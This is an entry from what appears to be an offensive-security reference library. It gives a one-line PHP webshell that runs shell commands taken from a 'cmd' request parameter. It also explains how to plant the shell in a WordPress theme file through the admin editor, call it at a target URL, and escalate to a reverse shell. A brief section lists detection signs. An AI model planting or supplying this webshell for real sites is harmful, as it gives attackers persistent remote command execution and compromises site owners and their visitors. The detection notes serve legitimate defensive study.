---
id: 841fa9e1-4d76-435f-b0ec-416139cb5c75
type: code
language: php
verified: true
created_at: '2019-10-09T23:27:19.399478+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
  - Linux
tags:
  - webshell
  - rce
  - php
validated: true
---

# php-simple-webshell-for-command-execution

## Code

```php
<?php system($_REQUEST["cmd"]); ?>
```

## Description

A minimal PHP webshell that executes system commands passed via the 'cmd' URL parameter, allowing RCE when injected into a web-accessible file like header.php in WordPress.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_REQUEST["cmd"] | Command from URL (e.g., ?cmd=whoami) | whoami |

## Usage

Inject into theme file via WP admin editor. Access via http://target/?cmd=<command> for execution as web user. Use in authenticated WordPress compromise to bridge to reverse shell.

## Detection

- Monitor PHP files for system() calls
- Web logs show suspicious ?cmd= parameters
- Process monitoring: www-data spawning bash/cmd

## Related

- [[procedures/add-and-execute-php-code-on-wordpress-site-authenticated]]
- [[procedures/upgrade-website-rce-to-reverse-shell-on-linux]]
